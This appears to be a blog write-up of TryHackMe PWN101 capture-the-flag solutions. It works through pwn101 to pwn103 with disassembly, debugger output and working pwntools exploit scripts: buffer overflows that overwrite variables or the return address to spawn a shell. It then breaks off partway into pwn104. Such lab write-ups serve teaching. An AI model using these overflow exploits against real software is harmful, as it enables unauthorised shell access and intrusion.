---
layout: post
title: "[TryHackMe] PWN101 Solutions: pwn101 - pwn105"
date: 2026-04-26
categories: [TryHackMe, PWN101]
---

# {{ page.title }}

## PWN101 Room Brief
```
Prerequisites

Before jumping into this room, there are some prerequisites to complete the challenges:
- C programming language
- Assembly language (basics)
- Some experience in reverse engineering, using debuggers, understanding low-level concepts
- Python scripting and pwntools
- A lot of patience

These are the things you're going to learn in this room:
- Buffer overflow
- Modify variable's value
- Return to win
- Return to shellcode
- Integer Overflow
- Format string exploit
- Bypassing mitigations
- GOT overwrite
- Return to PLT
- Playing with ROP
```

---
---
## Challenge Solutions:
- [pwn101 Solution](#pwn101-solution)
- [pwn102 Solution](#pwn102-solution)
- [pwn103 Solution](#pwn103-solution)
- [pwn104 Solution](#pwn104-solution)
- [pwn105 Solution](#pwn105-solution)
- [References](#references)

---
---
## pwn101 Solution
### Disassembly:
```c
int32_t main (void) {
    char * s;
    unsigned long long var_ch;
    var_ch = data.00000539;
    eax = 0;
    setup ();
    eax = 0;
    banner ();
    puts ("Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have low memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can you help me to buy those items :D\n");
    puts ("Type the required ingredients to make briyani: ");
    rax = &s;
    rdi = rax;
    eax = 0;
    gets ();
    if (var_ch == data.00000539) {
        puts ("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
        exit (data.00000539);
    }
    puts ("Thanks, Here's a small gift for you <3");
    rdi = "/bin/sh";
    system ();
    return rax;
}
```

At the start of the `main()` function a variable `var_ch` is defined and assigned some value. It then prompts the user to enter the *ingredients* for a recipe. It uses the `gets()` function to receive user input and store it. The `gets()` function is strongly advised against because it has no bounds checking when writing input into a buffer, which can lead to a buffer overflow.

After receiving input from the user, it checks to see if the variable `var_ch` still contains the original value `data.00000539`. If it does, then it outputs a message and exits however if the value is not the same as the original value, then it outputs *"Thanks, Here's a small gift for you <3"* and spawns a shell.

To solve this challenge, we need to overwrite the value of `var_ch` with anything that is not the original value.

```text
Dump of assembler code for function main:
   0x000000000000088e <+0>:	push   rbp
   0x000000000000088f <+1>:	mov    rbp,rsp
   0x0000000000000892 <+4>:	sub    rsp,0x40
   0x0000000000000896 <+8>:	mov    DWORD PTR [rbp-0x4],0x539            <--- var_ch variable located at rbp-0x4
   0x000000000000089d <+15>:	mov    eax,0x0
   0x00000000000008a2 <+20>:	call   0x81a <setup>
   0x00000000000008a7 <+25>:	mov    eax,0x0
   0x00000000000008ac <+30>:	call   0x87b <banner>
   0x00000000000008b1 <+35>:	lea    rdi,[rip+0x208]        # 0xac0
   0x00000000000008b8 <+42>:	call   0x6b0 <puts@plt>
   0x00000000000008bd <+47>:	lea    rdi,[rip+0x2dc]        # 0xba0
   0x00000000000008c4 <+54>:	call   0x6b0 <puts@plt>
   0x00000000000008c9 <+59>:	lea    rax,[rbp-0x40]                   <--- gets() writes to buffer located at rbp-0x40
   0x00000000000008cd <+63>:	mov    rdi,rax
   0x00000000000008d0 <+66>:	mov    eax,0x0
   0x00000000000008d5 <+71>:	call   0x6d0 <gets@plt>
   0x00000000000008da <+76>:	cmp    DWORD PTR [rbp-0x4],0x539
```

The defined buffer that `gets()` writes to is 0x40 (64) bytes. The location of the buffer is `rbp-0x40` and the location of the `var_ch` variable is `rbp-0x4`, `0x40 - 0x4 = 0x3c (60)`. To overwrite the `var_ch` variable, we just need to send over 60 bytes of input.

### Exploit (manual):
```bash
$ (perl -e 'print "A"x61'; cat;) | ./pwn101 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 

Thanks, Here's a small gift for you <3
ls
exploit.py  pwn101
```

### Exploit (pwntools):
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn101", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 61
buffer = b"A"*offset

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendline(buffer)
p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit.py 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
Thanks, Here's a small gift for you <3
$ ls
exploit.py  pwn101
```

### Remote Exploitation:
```text
$ python3 exploit.py REMOTE HOST=$IP PORT=9001
[+] Opening connection to XX.XX.XX.XX on port 9001: Done
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101          

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
Thanks, Here's a small gift for you <3
$ whoami
pwn101
$ cat flag.txt
THM{XXXXXXXXXXXXXXXXXXXXXXXXXX}
```

---
---
## pwn102 Solution
### Disassembly:
```c
int32_t main (void) {
    int64_t var_78h;
    unsigned long long var_10h;
    unsigned long long var_ch;
    eax = 0;
    setup ();
    eax = 0;
    banner ();
    var_ch = 0xbadf00d;
    var_10h = 0xfee1dead;
    edx = 0xfee1dead;
    eax = var_ch;
    esi = var_ch;
    eax = 0;
    printf ("I need %x to %x\nAm I right? ");
    rax = &var_78h;
    rsi = rax;
    rdi = data_00000b66;
    eax = 0;
    isoc99_scanf ();
    if (var_ch == 0xc0ff33) {
        if (var_10h == 0xc0d3) {
            edx = var_10h;
            eax = var_ch;
            esi = var_ch;
            eax = 0;
            printf ("Yes, I need %x to %x\n");
            rdi = "/bin/sh";
            system ();
        }
    } else {
        puts ("I'm feeling dead, coz you said I need bad food :(");
        exit (data.00000539);
    }
    return rax;
}
```

At the start of the `main()` function, two variable are defined. The variable `var_ch` is assigned the value `0xbadf00d` and the variable `var_10h` is assigned the value `0xfee1dead`.

It outputs the string *"I need badf00d to fee1dead Am I right?"* before allowing the user to provide some input. After user input has been received, it checks to see if the value of `var_ch` is `0xc0ff33` and if the value of `var_10h` is `0xc0d3`. If both values match the comparisons, then it outputs *"Yes, I need c0ff33 to c0d3"* and spawns a shell. Otherwise, it will output a message and exit.

To solve this challenge, we need to overwrite both variable values with the values that they are compared against, `var_ch` should be overwritten with `0xc0ff33` and `var_10h` should be overwritten with `0xc0d3`.

```text
Dump of assembler code for function main:
   0x00000000000008fe <+0>:	push   rbp
   0x00000000000008ff <+1>:	mov    rbp,rsp
   0x0000000000000902 <+4>:	sub    rsp,0x70                         <--- Subtract 0x70 (112) bytes for buffer
   0x0000000000000906 <+8>:	mov    eax,0x0
   0x000000000000090b <+13>:	call   0x88a <setup>
   0x0000000000000910 <+18>:	mov    eax,0x0
   0x0000000000000915 <+23>:	call   0x8eb <banner>
   0x000000000000091a <+28>:	mov    DWORD PTR [rbp-0x4],0xbadf00d    <--- var_ch is at rbp-0x4
   0x0000000000000921 <+35>:	mov    DWORD PTR [rbp-0x8],0xfee1dead   <--- var_10h is at rbp-0x8
   0x0000000000000928 <+42>:	mov    edx,DWORD PTR [rbp-0x8]
   0x000000000000092b <+45>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000092e <+48>:	mov    esi,eax
   0x0000000000000930 <+50>:	lea    rdi,[rip+0x212]        # 0xb49
   0x0000000000000937 <+57>:	mov    eax,0x0
   0x000000000000093c <+62>:	call   0x730 <printf@plt>
   0x0000000000000941 <+67>:	lea    rax,[rbp-0x70]                   <--- scanf() writes to buffer at rbp-0x70
   0x0000000000000945 <+71>:	mov    rsi,rax
   0x0000000000000948 <+74>:	lea    rdi,[rip+0x217]        # 0xb66
   0x000000000000094f <+81>:	mov    eax,0x0
   0x0000000000000954 <+86>:	call   0x750 <__isoc99_scanf@plt>
```

The buffer that `scanf()` writes to is `0x70` (`112`) bytes large located at `rbp-0x70`, the variable `var_ch` (`0xbadf00d`) is located at `rbp-0x4` and the variable `var_10h` (`0xfee1dead`) is located at `rbp-0x8`.

We can calculate the amount of data we need to send before overwriting the first variable on the stack `var_10h` by subtracting `0x8` from `0x70` which equals `104` in decimal. So, we need to send 104 bytes of junk, then the new value for `var_10h` (`0xc0d3`) and then the new value for `var_ch` (`0xc0ff33`). We can prove this by using **GDB GEF**.

```text
gef➤  patt cr 200                  <--- Generate a unique cyclic pattern
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'

gef➤  b *main+91
Breakpoint 1 at 0x555555400959     <--- Set a breakpoint at the first comparison

gef➤  r
Starting program: ./pwn102 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

gef➤  x/10s $rbp-0x8              <--- Find the string located at rbp-0x8
0x7fffffffdcb8:	"naaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
gef➤  x/10s $rbp-0x4              <--- Find the string located at rbp-0x4
0x7fffffffdcbc:	"aaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"

gef➤ patt off naaaaaaaoaaaaaaapaaaaa
[+] Searching for '616161616170616161616161616f616161616161616e'/'6e616161616161616f61616161616161706161616161' with period=8
[+] Found at offset 104 (big-endian search)     <--- Calculates that the offset before overwriting var_10h is 104 bytes

gef➤  patt off aaaaoaaaaaaapaaaaaaaqa
[+] Searching for '61716161616161616170616161616161616f61616161'/'616161616f6161616161616170616161616161617161' with period=8
[+] Found at offset 108 (big-endian search)
```

### Exploit (manual):
```bash
$ (perl -e 'print "A"x104 . "\xd3\xc0\x00\x00" . "\x33\xff\xc0\x00"'; cat;) | ./pwn102 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? 
Yes, I need c0ff33 to c0d3
ls
exploit.py  pwn102
```

### Exploit (pwntools):
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn102", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 104
buffer = b"A"*offset
buffer += p32(0xc0d3)
buffer += p32(0xc0ff33)

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendline(buffer)
p.interactive()

# Close connection
p.close()
```

### Remote Exploitation:
```text
$ python3 exploit.py REMOTE HOST=$IP PORT=9002
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102          

I need badf00d to fee1dead
Am I right? Yes, I need c0ff33 to c0d3
$ whoami
pwn102
$ cat flag.txt
THM{XXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```

---
---
## pwn103 Solution
### Disassembly:
#### main()
```c
void main(void)
{
    int64_t var_ch;
    
    setup();
    banner();
    puts("➖➖➖➖➖➖➖➖➖➖➖");
    puts(data.004032c0);
    puts("➖➖➖➖➖➖➖➖➖➖➖");
    printf(data.00403323);
    __isoc99_scanf(data.00403340, &var_ch);
    // switch table (6 cases) at 0x403344
    switch((undefined4)var_ch) {
    default:
        main();
        break;
    case 1:
        announcements();
        break;
    case 2:
        rules();
        break;
    case 3:
        general();
        break;
    case 4:
        discussion();
        break;
    case 5:
        bot_cmd();
    }
    return;
}
```

#### general()
```c
void general(void)
{
    int32_t iVar1;
    char *s1;
    
    puts(data.004023aa);
    puts("------[jopraveen]: Hello pwners 👋");
    puts("------[jopraveen]: Hope you\'re doing well 😄");
    puts("------[jopraveen]: You found the vuln, right? 🤔\n");
    printf("------[pwner]: ");
    __isoc99_scanf(data.0040245c, &s1);
    iVar1 = strcmp(&s1, data.0040245f);
    if (iVar1 == 0) {
        puts("------[jopraveen]: GG 😄\n");
        main();
    } else {
        puts("Try harder!!! 💪");
    }
    return;
}
```

#### admins_only()
```c
void admins_only(void)
{
    puts(data.00403267);
    puts("Welcome admin 😄");
    system("/bin/sh");
    return;
}
```

The `main()` function outputs a menu allowing the user to choose which function of the binary to call. The `general()` function outputs some *messages* before prompting the user to enter their own message. It compares the user's message against a fixed string and if the strings match, then another *message* saying *"GG"* is printed. We can find the comparison string using multiple methods but an easy way is to use `ltrace`.

```text
$ ltrace ./pwn103
{SNIPPED}
puts("------[jopraveen]: Hello pwners "...------[jopraveen]: Hello pwners 👋)                                                           = 37
puts("------[jopraveen]: Hope you're d"...------[jopraveen]: Hope you're doing well 😄)                                                           = 47
puts("------[jopraveen]: You found the"...------[jopraveen]: You found the vuln, right? 🤔)                                                           = 52
printf("------[pwner]: "------[pwner]: )                      = 15
__isoc99_scanf(0x40245c, 0x7ffd67e1ed30, 0, 0test
)                                                             = 1
strcmp("test", "yes")               <--- out input "test" is compared against the string "yes"
puts("Try harder!!!"Try harder!!! 💪
```

Although this does not help as all it does it print out *"GG"* if the strings match. The vulnerability is the use of `scanf()` as if it is not implemented correctly it can cause a buffer overflow as there is no bounds checking, similar to the `gets()` function.

Finally, the `admins_only()` function spawns a shell when called, however there is no direct option to call this function. Instead we must find a way to call it, such as by overwriting the instruction pointer with the address of `admins_only()` by exploiting a buffer overflow.

### Binary Protections (checksec):
```bash
$ checksec ./pwn103
[*] './pwn103'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

There is no canary so a buffer overflow is easily achievable, no **PIE** so the addresses for functions and variables are always located at the same memory locations when the binary is run, but the **NX** (**Non Executable Stack**) bit is set, so we cannot use shellcode.

### Finding the offset:
```text
gef➤  patt cr 200
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'

gef➤  r
Starting program: ./pwn103 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x13              
$rbx   : 0x0               
$rcx   : 0x00007ffff7f9f790  →  0x0000000000000000
$rdx   : 0x00007ffff7f9f790  →  0x0000000000000000
$rsp   : 0x00007fffffffdca8  →  "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
$rbp   : 0x6161616161616165 ("eaaaaaaa"?)
$rsi   : 0x00007ffff7f9e643  →  0xf9f790000000000a ("\n"?)
$rdi   : 0x0               
$rip   : 0x0000000000401377  →  <general+00b9> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffdde8  →  0x00007fffffffe15c  →  "./pwn103"
$r13   : 0x1               
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2f0  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdca8│+0x0000: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"	 ← $rsp
0x00007fffffffdcb0│+0x0008: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x00007fffffffdcb8│+0x0010: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana[...]"
0x00007fffffffdcc0│+0x0018: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoa[...]"
0x00007fffffffdcc8│+0x0020: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
0x00007fffffffdcd0│+0x0028: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
0x00007fffffffdcd8│+0x0030: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"
0x00007fffffffdce0│+0x0038: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401370 <general+00b2>   call   0x401040 <puts@plt>
     0x401375 <general+00b7>   nop    
     0x401376 <general+00b8>   leave  
 →   0x401377 <general+00b9>   ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn103", stopped 0x401377 in general (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401377 → general()

gef➤  patt off faaaaaaagaaaaaa             <--- Locating the offset using the string that rsp was overwritten with
[+] Searching for '616161616161676161616161616166'/'666161616161616167616161616161' with period=8
[+] Found at offset 40 (big-endian search)
```

The offset until we overwrite the `rip` is 40 bytes. So, we need to send 40 bytes of junk and then the address of the `admins_only()` function.

### Exploit (pwntools):
```py
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn103", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 40
buffer = b"A"*offset
buffer += p64(binary.sym["admins_only"] + 0x8)  # The address of admins_only() plus 8 bytes - more reliable exploitation

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendlineafter(b"channel: ", b"3")     # Send "3" to enter the general() function
p.sendlineafter(b"[pwner]: ", buffer)   # Send the buffer overflow payload when prompted for input

p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit.py 
Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
$ ls
exploit.py  pwn103
```

### Remote Exploitation:
```text
$ python3 exploit.py REMOTE HOST=$IP PORT=9003
[+] Opening connection to XX.XX.XX.XX on port 9003: Done
[*] Switching to interactive mode
Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
$ whoami
pwn103
$ cat flag.txt
THM{XXXXXXXXXXXXX}
```

---
---
## pwn104 Solution
### Disassembly:
```c
void main(void)
{
    void *buf;
    
    setup();
    banner();
    puts("I think I have some super powers 💪");
    puts("especially executable powers 😎💥\n");
    puts("Can we go for a fight? 😏💪");
    printf("I\'m waiting for you at %p\n", &buf);
    read(0, &buf, 200);
    return;
}
```

The `main()` function outputs a few strings and a string which leaks the address of the buffer which the `read()` call writes to. The `read()` call reads 200 bytes of user input and writes it into the buffer.

```text
0x00000000004011cd <+0>:	push   rbp
0x00000000004011ce <+1>:	mov    rbp,rsp
0x00000000004011d1 <+4>:	sub    rsp,0x50
```

The size of the buffer is `0x50` (`80`) bytes large, so the `read()` function writing 200 bytes of user input into it will overflow the buffer and possibly allow us to overwrite the return address.

### Binary Protections (checksec):
```bash
$ checksec ./pwn104
[*] './pwn104'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

The binary has no canary, no **PIE** and the stack is executable, this means that we can place shellcode on the stack and return or jump to it to execute it.

### Finding the offset:
```text
gef➤  patt cr 200
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
[+] Saved as '$_gef0'

gef➤  r
Starting program: ./pwn104 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104          

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7fffffffdc70
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xc8              
$rbx   : 0x0               
$rcx   : 0x00007fffffffdde8  →  0x00007fffffffe15c  →  "./pwn104"
$rdx   : 0x0               
$rsp   : 0x00007fffffffdcc8  →  "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"
$rbp   : 0x616161616161616b ("kaaaaaaa"?)
$rsi   : 0x00007fffffffdc70  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rdi   : 0x0               
$rip   : 0x000000000040124e  →  <main+0081> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x00007fffffffdde8  →  0x00007fffffffe15c  →  "./pwn104"
$r13   : 0x1               
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2f0  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdcc8│+0x0000: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"	 ← $rsp
0x00007fffffffdcd0│+0x0008: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]"
0x00007fffffffdcd8│+0x0010: "naaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaata[...]"
0x00007fffffffdce0│+0x0018: "oaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaaua[...]"
0x00007fffffffdce8│+0x0020: "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"
0x00007fffffffdcf0│+0x0028: "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]"
0x00007fffffffdcf8│+0x0030: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"
0x00007fffffffdd00│+0x0038: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401247 <main+007a>      call   0x401050 <read@plt>
     0x40124c <main+007f>      nop    
     0x40124d <main+0080>      leave  
 →   0x40124e <main+0081>      ret    
[!] Cannot disassemble from $PC
